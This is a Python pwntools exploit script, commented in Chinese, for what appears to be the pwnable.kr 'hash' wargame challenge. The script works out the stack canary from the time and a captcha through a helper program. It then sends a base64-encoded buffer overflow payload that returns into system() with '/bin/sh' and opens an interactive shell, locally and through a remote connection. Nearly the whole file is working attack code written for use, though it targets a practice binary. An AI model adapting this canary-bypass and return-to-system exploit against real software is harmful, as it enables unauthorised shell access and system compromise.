#-*-coding:utf-8 -*-
'''
总的思路本地实验能够拿下以后,直接远程好像不太行
然后选了一个ssh登上,上传到tmp以后,修改exp运行以后getshell
'''
from pwn import *
from base64 import b64encode
import os
local=1
plt_system = 0x08048880
import urllib2
if local:
    t=time.time()
    t=int(t)
    p=process('./hash')
    print p.recvuntil(": ")
    capcha=p.recv()[:-1]
    print "capcha is ",capcha
    p.sendline(capcha)
    print p.recv()
    capcha=int(capcha)
    st=os.popen('./getcanary {} {}'.format(str(t), capcha)).read()
    print "result of canary is : "+"0x"+st
    canary='0x'+st
    canary=int(canary,16)
    print "int canary is "+str(canary)
    #canary = '0x' +
    # payload = 'A' * 512 + p32(canary) +\
    #  'A' * 12 + p32(plt_system)\
    # + p32(0x8048a00) + \
    # p32(0x0804B0E0 + 540*4/3)
    # p.sendline(b64e(payload) + '/bin/sh\0')
    # # print payload
    # p.interactive()
    # #
#这里留给我的一个疑问就是,payload部分encode了然而后面/bin/sh没有encode
#我觉得是b64decode过程只把能够解码的连续部分给解码了,然后不能解码的部分就没有管了
#/bin/sh天然存到了gbuf全局段,所以不要b64encode发过去#[plt_system][ret][arg1][arg2]...
#构造好就ok了
    payload = 'A' * 512 + p32(canary) + 'A' * 12 + p32(plt_system) + p32(0x8048a00) + p32(0x0804B0E0 + 540*4/3)
    gdb.attach(p)
    p.sendline(b64e(payload) + '/bin/sh\0')

    # payload = 'A' * 512 + p32(canary) + 'A' * 12 + p32(plt_system) + p32(0x8048a00)\
    #  + p32(0x0804B0E0 + 540*4/3)+ '/bin/sh\0'
    # gdb.attach(p)
    # p.sendline(b64e(payload) )
    p.interactive()
else:
    #以下这种远程行不通
    # date = urllib2.urlopen('http://pwnable.kr').headers['Date']
    #
    # t = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
    # t += 0
    t=time.time()
    t=int(t)
    print "remote time is : ",str(t)
    p = remote('127.0.0.1',9002)
#context.log_level='debug'

    print p.recvuntil(": ")
    capcha=p.recv()[:-1]
    print "capcha is ",capcha
    p.sendline(capcha)
    print p.recv()
    capcha=int(capcha)
    st=os.popen('/tmp/getcanary {} {}'.format(str(t), capcha)).read()
    print "result of canary is : "+"0x"+st
    canary='0x'+st
    canary=int(canary,16)
    print "int canary is "+str(canary)
    #canary = '0x' +
    # payload = 'A' * 512 + p32(canary) +\
    #  'A' * 12 + p32(plt_system)\
    # + p32(0x8048a00) + \
    # p32(0x0804B0E0 + 540*4/3)
    # p.sendline(b64e(payload) + '/bin/sh\0')
    # # print payload
    # p.interactive()
    # #

    payload = 'A' * 512 + p32(canary) + 'A' * 12 + p32(plt_system) + p32(0x8048a00) + p32(0x0804B0E0 + 540*4/3)

    p.sendline(b64e(payload) + '/bin/sh\0')
    p.interactive()
